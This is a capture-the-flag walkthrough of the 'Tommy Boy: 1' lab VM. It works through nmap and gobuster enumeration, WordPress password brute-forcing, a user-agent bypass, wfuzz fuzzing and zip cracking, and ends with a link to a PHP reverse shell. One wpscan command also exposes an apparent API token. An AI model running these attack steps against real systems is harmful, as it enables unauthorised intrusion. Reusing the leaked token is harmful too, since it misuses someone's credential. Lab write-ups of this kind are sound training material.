# TOMMY BOY: 1

# 1 Information gathering
## 1.1 Discovery host
`nmap -n -Pn -F 192.168.196.1/24 -oN host_discovery.txt`
![658e8dd5ec063ce4f0cf0e74b55cfbed.png](./_resources/75a1c51c20bd44d1a555735df259b773.png)


## 1.2 Service enum
`nmap -sV -sC -p- 192.168.196.6 -oN full_service_enum-sC.txt`
![11fa5edf7e4938bae413be19e3f7beb4.png](./_resources/0e0299dd2a0c4b3396a3f4b51f427926.png)

`nmap -sV -sU -F 192.168.196.6 -oN udp-sC-sV.txt`

## 1.3 Web 80
### 1.3.1 Gobuster enum web content
`gobuster dir -u http://192.168.196.6 -w /usr/share/wordlists/dirb/big.txt -t 50 -x php,bkp,bak,txt,html,aspx -f -o info-slash.txt`
Here we can grep responses that dont contain `7` (starting number for default response size):
![a2e1d1919eaeb2eafe036e118baf8669.png](./_resources/d8e09f94168e478f984cd4772525e3b3.png)

`gobuster dir -u http://192.168.196.6 -w /usr/share/wordlists/dirb/big.txt -t 50 -x php,bkp,bak,txt,html,aspx -o info.txt`
And here, we can grep responses that dont contain `302`:
![377c51c3851031d039d6e85244ece65a.png](./_resources/0d2f83f1b7c246b49f043b3c0961e4ab.png)

![7bcaecbd5080985313ea7d05486faba1.png](./_resources/b6bd04886b8e47c8a11f7288e825d57a.png)

![5c69086f685644983d4b721991720c63.png](./_resources/af86d7f258ec4ba9a40294507fb37992.png)

### 1.3.2 Html source code
![da4e1fa0bfb2f3c44e6d9fa2ff71a9b7.png](./_resources/f16c8efc829640e9adc047f547000e26.png)
There is a conversation.
There is a hint to find the blog name. The youtube video provided there says: “prehistoric forest”.
We tried use it as folder, and bingo!
![c1833446dc7e47bc4cbff8d7a0072105.png](./_resources/e7a1a0d49d8c46eaaf419b896c219bea.png)

### 1.3.3 Wordpress found
`gobuster dir -u http://192.168.196.6/prehistoricforest/ -w /usr/share/wordlists/dirb/big.txt -t 50 -x php,bkp,bak,txt,html,aspx -f -o info-slash.txt`
![9bfe5c495ef9258eef2cc20d52f9ff41.png](./_resources/383ccd374d1f4f34b5e8127533321afd.png)

#### 1.3.3.1 Wpscan
`wpscan --url http://192.168.196.6/prehistoricforest/ -e ap,at,tt,cb,dbe,u1-20,m --plugins-detection aggressive --disable-tls-checks --api-token 7MBL9noH6s6pOW5qAM6boXVS5wEMayvrBaaoBbMaIKg -o all-info.txt --ignore-main-redirect`

#### 1.3.3.2 Wordpress protected page
![84049290c07b861013556e388cc4bf00.png](./_resources/66f5982a6e574ff49941c2d8e8fd21f5.png)

Tom jr asked a question, and there is a interesting comment:
![da78716a22383f34f7085f60d4b305c7.png](./_resources/513578f0b1024afab94edce136dae94e.png)

Using `strings` on the image found in the directory mentioned, there is a MD5 hash:
![b2c81ce84824fe6e342b70aadccdc50b.png](./_resources/a919d8af0b904d54b04b3d5e931c9da9.png)
`ce154b5a8e59c89732bc25d6a2e6b90b`

![50a36a5563590094acc32c0ecf663a33.png](./_resources/291373b931ed4cb79377c3d22bb2db52.png)
`spanky`

Now we can unprotect this page and read it:
![04be124c8af1ea346819447848200483.png](./_resources/ef24e1635c014fa283bcab2dd3aedabf.png)
![b17f52db64eb5d3c35283187e12bc395.png](./_resources/8462515d0f2a4ed3be3d3af3290ea4b9.png)

## 1.4 Simple bash script to find intermittent ftp port
With the above tips found previously, we can search this ftp port using a simple script:
```
#!/bin/bash

while true; 
do
	echo "[!] Executando varredura!"
   	nmap -p- -sV -T4 192.168.196.6 -n -Pn | grep -i ftp > teste.txt

   	if [ -s ./teste.txt ];
	then
		cat teste.txt
		exit 0
	fi
done
```

# 2 Exploitation
## 2.1 Brute force with wpscan
`wpscan --url http://192.168.196.6/prehistoricforest/ -P /root/shared/rockyou.txt -U users.txt -t 100`
![ec2581a159efe01c8e819d749803ef69.png](./_resources/7eb3eae7a782465ea143e096b39f7c54.png)

## 2.2 Login as nickburns using simple password
With the previous tip about logging in to ftp as nickburns, we tried using the username as the password and it works:
![c1229df1fcb0993b7058f7f90aa4ae57.png](./_resources/fd570b05cbd04ec4bc0492e1416f5845.png)
![3fc6379d8ddf9b3d351dc65d5c7dafb3.png](./_resources/38b41202977c469e9f32f732d27a0cd2.png)

## 2.3 Bypass user-agent based blocking
Accessing the cited directory, we can't view the content. But there is a message with a tip:
![69fb23bae6aafb159f8543062f6f1008.png](./_resources/8de5fe233e984be98b14fba3d3bb80bb.png)

Changing the user-agent to another, an iphone's agent, we can view the full content:
https://developers.whatismybrowser.com/useragents/explore/operating_system_name/ios/
![0ad5561dd94442f8ffb94f6d764603b0.png](./_resources/11c641314f714585a28da7ec9afb58f3.png)
Another tip!

### 2.3.1 Wfuzz enum web content
`wfuzz -u "http://192.168.196.6/NickIzL33t/FUZZ.html" -w root/shared/rockyou.txt -f info.txt -H "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 12_2 like Mac OS X) "`
We receveiced a `200` response with different size:
![77bd6ff06894d3ebe4691322dc304c7e.png](./_resources/e40d8a90d4cc4e4eba00178ea6ca3d22.png)

### 2.3.2 New file - fallon1.html
![778a8c7ca1a3de623f20c306cc0330f8.png](./_resources/c65c2f4511a34a0fb92170725fb59b59.png)

#### 2.3.2.1 A hint
![a6ece17da2d1d4b59f751e094d3f329a.png](./_resources/8c2fa19c6eaf4d73ad669cf7c9637549.png)

#### 2.3.2.2 A zip file with password
![0d86f4abadc393b10f38527a174d69d7.png](./_resources/da9ca7afe6234e4e803ea624ba752d2a.png)

#### 2.3.2.3 Upload cababilities
![80b4b2e3ed3574c08af0f3d8edb497e0.png](./_resources/e518e479ed324c549e21621be042ffd6.png)
Without success here.

### 2.3.3 Generate wordlist with Cruch and cracking zip file with John

`crunch 13 13 -t bev,%%@@^1995 > wordlist.txt`

`zip2john t0msp4ssw0rd.zip > hash.hash`
`john hash.hash wordlist.txt`

Or you can user fcrackzip
`fcrackzip -v -u -D -p wordlist.txt t0msp4ssw0rdz.zip`
![f4fdee485d2ef94aa40596743d92f818.png](./_resources/247028d5cda1454e8ca9f0be7fbe124e.png)
bevH00tr$1995

![399de380e4f1a29a08d22ec3455e510f.png](./_resources/d87cb02df28e43a78c1e744001e42518.png)

### 2.3.4 Another hint that reveals a page with info
![dd543fa7906c4852e6b1dd3d5834edf6.png](./_resources/f06331d37f224910918e2667f68b92e9.png)

![e5d6537cb822b77ccbff65a5b2ebf92a.png](./_resources/757ce0a918904da1ba120fa3f63d1e42.png)
fatguyinalittlecoat1938!!

### 2.3.5 Login as bigtommysenior
![e2f9b511a91784f6a3fb008076b512af.png](./_resources/5109045aeae54ffca292ea451d6a2e86.png)


# 3 Post-exploitation
Was used LinEnum.sh to enumerate this Linux, but without good results.
At this points, the option was manually find writable files due LinEnum.sh don't found the necessary file.
`find / -perm -222 -type d 2>/dev/null`

![aec84f362889f16aaf0ee1e0de07e0b7.png](./_resources/c8554937aad148669fa7fa6865605902.png)
Here we can create a reverse shell file, use it and verify if the web system uses another user.

## 3.1 Reverse shell (pentest monkey)
https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
![a0771ad1846c6b2f3ff2b20e9d265ee9.png](./_resources/c73f22ecae044de998995edd40392b36.png)

It is worth remembering that this machine does not have root escalation, so we finish here.